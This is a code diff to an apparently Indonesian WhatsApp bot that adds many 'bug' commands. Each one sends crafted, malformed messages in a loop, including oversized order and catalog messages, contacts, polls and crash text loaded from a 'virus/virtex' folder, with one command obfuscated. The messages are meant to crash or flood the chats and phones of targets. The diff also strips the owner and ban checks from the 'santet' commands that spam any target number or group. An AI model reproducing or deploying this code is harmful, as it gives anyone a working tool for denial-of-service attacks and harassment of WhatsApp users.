@@ -35,6 +35,7 @@ const { pinterest } = require("./lib/pinterest")
 const toHur = require('@develoka/angka-terbilang-js')
 const { virtex, vipi } = require('./virus/virtex/virtex.js')
 const { ngazap } = require('./virus/virtex/ngazap')
+const { ngazap } = require('./virus/virtex/ngazap')
 const { buttonvirus } = require('./virus/virtex/buttonvirus')
 const { buttonkal } = require('./virus/virtex/buttonkal')
 const { bugsw } = require('./virus/virtex/bugsw')
@@ -49,6 +50,7 @@ const { apidanz } = JSON.parse(fs.readFileSync('./apidanz.js'))
 const { lolkey } = JSON.parse(fs.readFileSync('./lolkey.js'))
 const { frkey } = JSON.parse(fs.readFileSync('./frkey.js'))
 const { hentai } = require('./lib/scraper2.js')
+virgam = fs.readFileSync(`./baseikal/image/deden.jpeg`)
 const {
  FajarNews, 
  BBCNews,
@@ -4921,10 +4923,394 @@ Detek = tes.translate
 replay(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
 }
 break
+case 'bugstik':{
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `YOU ARE AN IDIOT`
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.sendMessage(m.chat, {sticker: thumb},{quoted: {
+key: { 
+fromMe: false, 
+participant: `0@s.whatsapp.net`, 
+...({ remoteJid: "" }) 
+}, 
+"message": {
+"stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
+"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
+"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
+"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
+"mimetype": "image/webp",
+"height": 1288,
+"width": 1288,
+"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
+"fileLength": "14240",
+"mediaKeyTimestamp": "1664991742",
+"isAnimated": false,
+}
+}
+}})
+}
+deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
+}
+break
+case 'buttonampas':
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `YOU ARE AN IDIOT`
+for (let i = 0; i < jumlah; i++) {
+const buttons = [
+{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
+{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
+{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
+]
+const buttonMessage = {
+text: "YOU ARE AN IDIOT",
+footerText: 'Pe',
+buttons: buttons,
+headerType: 1
+}
+XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+ break
+//=================================================//
+case 'bugtag': {
+if (!m.isGroup) throw groupon(from)
+XeonBotInc.sendMessage(m.chat, { text : `${buttonkal}` , mentions: participants.map(a => a.id)}, { quoted: doc })
+}
+break
+case 'buglokas': {
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `YOU ARE AN IDIOT`
+for (let i = 0; i < jumlah; i++) {
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./virus/image/hwmodsgans.jpg') }, { upload: XeonBotInc.waUploadToServer })
+var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"locationMessage": {
+"degreesLatitude": -6.936928157735237,
+"degreesLongitude": 107.72270679473877,
+"caption": `©${ngazap(prefix)}`,
+"jpegThumbnail": messa.imageMessage,
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, location.message, { messageId: location.key.id })
+}
+}
+break
+case 'buginvite': {
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `YOU ARE AN IDIOT`
+for (let i = 0; i < jumlah; i++) {
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./virus/image/hwmodsgans.jpg') }, { upload: XeonBotInc.waUploadToServer })
+var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"groupInviteMessage": {
+"groupJid": "85296556573-1328272333@g.us",
+"inviteCode": "wFHwtOxGQN8OwK2x",
+"inviteExpiration": `${ngazap(prefix)}`,
+"groupName": `${ngazap(prefix)}`,
+"caption": `${ngazap(prefix)}`,
+"jpegThumbnail": messa.imageMessage,
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
+}
+}
+break
+case 'spam': {
+if (!m.quoted) return m.reply("Reply pesanya!")
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `YOU ARE AN IDIOT`
+for (let i = 0; i < jumlah; i++) {
+quoted.copyNForward(m.chat, true)
+}
+} 
+break
+case 'bugtiktok':
+if (!q) return m.reply(`Link Nya Kak`)
+if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return m.reply(`Contoh ${prefix+command} https://vm.tiktok.com/ZSdQycjUx/?k=1`)
+let dede = await caliph.downloader.tiktok(`${q}`)
+krt = await getBuffer(dede.nowm)
+m.reply(mess.wait)
+XeonBotInc.sendMessage(m.chat, { video: krt, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `${bugsw}` }, { quoted:m })
+break
+case 'searchgc':
+case 'searchgroups':
+if (!q) return m.reply(`Example: ${prefix}searchgroups hacker`)
+mel.linkwa(q)
+.then(result => {
+let res = '❰ *WHATSAPP GROUP LINKS* ❱\n\n'
+for (let i of result) {
+res += `*NAME*: *${i.nama}\n*Link*: ${i.link}\n\n`
+}
+reply(res)
+});
+break
+case 'bug1': {
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `YOU ARE AN IDIOT`
+for (let i = 0; i < jumlah; i++) {
+var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"audioMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
+"mimetype": "audio/mpeg",
+"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
+"fileLength": "258330",
+"seconds": 16,
+"ptt": false,
+"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
+"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
+"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
+"mediaKeyTimestamp": "1657190832",
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
+}
+}
+break
+//=================================================//
+case 'bug2': {
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `YOU ARE AN IDIOT`
+for (let i = 0; i < jumlah; i++) {
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./virus/image/hwmodsgans.jpg') }, { upload: XeonBotInc.waUploadToServer })
+var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"imageMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
+"mimetype": "image/jpeg",
+"caption": `${ngazap(prefix)}`,
+"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
+"fileLength": "42521",
+"height": 426,
+"width": 640,
+"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=",
+"fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=",
+"directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1",
+"mediaKeyTimestamp": "1657286523",
+"jpegThumbnail": messa.imageMessage,
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, image.message, { messageId: image.key.id })
+}
+}
+break
+//=================================================//
+case 'bug3': {
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `YOU ARE AN IDIOT`
+for (let i = 0; i < jumlah; i++) {
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./virus/image/hwmodsgans.jpg') }, { upload: XeonBotInc.waUploadToServer })
+var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"documentMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
+"mimetype": "application/octet-stream",
+"title": ".dev",
+"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+"pageCount": 0,
+"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
+"fileName": `${ngazap(prefix)}`,
+"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
+"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
+"mediaKeyTimestamp": "1657288637",
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, document.message, { messageId: document.key.id })
+}
+}
+break
+//=================================================//
+case 'bug4': {
+
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `YOU ARE AN IDIOT`
+for (let i = 0; i < jumlah; i++) {
+var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"extendedTextMessage": {
+"text": `https://chat.whatsapp.com/E7d7j8RzW9lCVn1xS6UEjx`,
+"matchedText": "https://chat.whatsapp.com/E7d7j8RzW9lCVn1xS6UEjx",
+"description": "Undangan Grup WhatsApp",
+"title": `${ngazap(prefix)}`,
+"previewType": "NONE",
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
+}
+}
+break
+//=================================================//
+case 'bug5': {
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `YOU ARE AN IDIOT`
+for (let i = 0; i < jumlah; i++) {
+var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
+"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
+"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
+"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
+"mimetype": "image/webp",
+"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
+"fileLength": "14240",
+"mediaKeyTimestamp": "1664991742",
+"isAnimated": false,
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
+}
+}
+break
+//=================================================//
+case 'bug6': {
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `YOU ARE AN IDIOT`
+for (let i = 0; i < jumlah; i++) {
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./virus/image/hwmodsgans.jpg') }, { upload: XeonBotInc.waUploadToServer })
+var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"extendedTextMessage": {
+"text": "https://wa.me/c/6281338302495",
+"matchedText": "https://wa.me/c/6281338302495",
+"description": "YOU ARE AN IDIOT",
+"title": `${ngazap(prefix)}`,
+"previewType": "NONE",
+"jpegThumbnail": messa.imageMessage,
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
+}
+}
+break
+//=================================================//
+case 'bug7': {
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `YOU ARE AN IDIOT`
+for (let i = 0; i < jumlah; i++) {
+var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"contactMessage": {
+"displayName": `${ngazap(prefix)}`,
+"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:XeonBotInc\nitem1.TEL;waid=6285714170944:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:YOU ARE AN IDIOT\nX-WA-BIZ-NAME:YOU ARE AN IDIOT\nEND:VCARD",
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
+}
+}
+break
+case 'inibug': {
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `YOU ARE AN IDIOT`
+for (let i = 0; i < jumlah; i++) {
+let teks = `══✪〘 *BANG INI BUG ? ☺️* 〙✪══
+ ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
+for (let mem of participants) {
+teks += `⭔ @${mem.id.split('@')[0]}\n`
+}
+XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })}
+}
+break
+//=================================================//
+case 'poll': {
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `YOU ARE AN IDIOT`
+for (let i = 0; i < jumlah; i++) {
+var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"pollCreationMessage": {
+"name": "YOU ARE AN IDIOT",
+"options": [
+{
+"optionName": "YOU ARE AN IDIOT"
+},
+{
+"optionName": "YOU ARE AN IDIOT"
+},
+{
+"optionName": "YOU ARE AN IDIOT"
+},
+{
+"optionName": "YOU ARE AN IDIOT"
+},
+{
+"optionName": "YOU ARE AN IDIOT"
+}
+],
+"selectableOptionsCount": 5
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
+deploy('sukses sendbug')}
+}
+break
+//=================================================//
+case 'jadikatalog': {
+if (!quoted) throw 'Reply Image/sticker'
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `YOU ARE AN IDIOT`
+for (let i = 0; i < jumlah; i++) {
+function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','HW\x20MODS\x20WA\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/6281214281312','397419wzTxRp','6281214281312@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':XeonBotInc[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':kalimage,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':doc});XeonBotInc['relayMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
+}
+}
+break
+//=================================================//
+case 'troli': {
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `YOU ARE AN IDIOT`
+for (let i = 0; i < jumlah; i++) {
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./virus/image/hwmodsgans.jpg') }, { upload: XeonBotInc.waUploadToServer })
+var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+ "orderMessage": {
+"orderId": "449756950375071",
+"orderImage": messa.imageMessage,
+"itemCount": 100000000000,
+"status": "INQUIRY",
+"surface": "CATALOG",
+"message": `${ngazap(prefix)}`,
+"jpegThumbnail":fs.readFileSync('./virus/image/pict.jpg'),
+"orderTitle": `${ngazap(prefix)}`,
+"sellerJid": "6285714170944@s.whatsapp.net",
+"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
+"totalAmount1000": "500000000000000",
+"totalCurrencyCode": "IDR",
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, order.message, { messageId: order.key.id })
+}
+}
+break
+case 'troli2': {
+if (args.length == 0) return anjay(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+a = await XeonBotInc.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${global.ownername}`,jpegThumbnail: thumb}}}
+var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"orderMessage": {
+"orderId": "599519108102353",
+"thumbnail": virgam,
+"itemCount": 1999,
+"status": "INQUIRY",
+"surface": "CATALOG",
+"message": " YOU ARE AN IDIOT ",
+"orderTitle": " BUG TROLI ", // 
+"sellerJid": "6281214281312@s.whatsapp.net",
+"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
+}
+}), { userJid: m.chat, quoted: doc })
+XeonBotInc.relayMessage(m.chat, order.message, { messageId: order.key.id })
+}
+}
+break
 case 'santetdia': {
-if (!isCreator) return
-if (isBan) throw sticBanLu(from)
-if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
+if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
 num = q.split('|')[0]
 jumlah = q.split('|')[1]
 for (let i = 0; i < jumlah; i++) {
@@ -4945,8 +5331,6 @@ m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 break
 //=================================================//
 case 'santetgc': {
-if (!isCreator) return
-if (isBan) throw sticBanLu(from)
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
 num = q.split('|')[0]
 jumlah = q.split('|')[1]
@@ -4967,8 +5351,6 @@ m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 }
 break
 case 'catalogpc': case 'cataloggc':  {
-if (!isCreator) return
-if (isBan) throw sticBanLu(from)
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
 num = q.split('|')[0]
 jumlah = q.split('|')[1]
@@ -4979,13 +5361,13 @@ var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "product": {
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
-"title": `© HW MODS WA${ngazap(prefix)}`,
-"description": `© HW MODS WA`,
+"title": `${ngazap(prefix)}`,
+"description": ``,
 "currencyCode": "IDR",
-"footerText": `© HW MODS WA`,
+"footerText": ``,
 "productImageCount": 1,
 "firstImageId": 1,
-"retailerId": `© HW MODS WA WE ARE NOT MASTOD`,
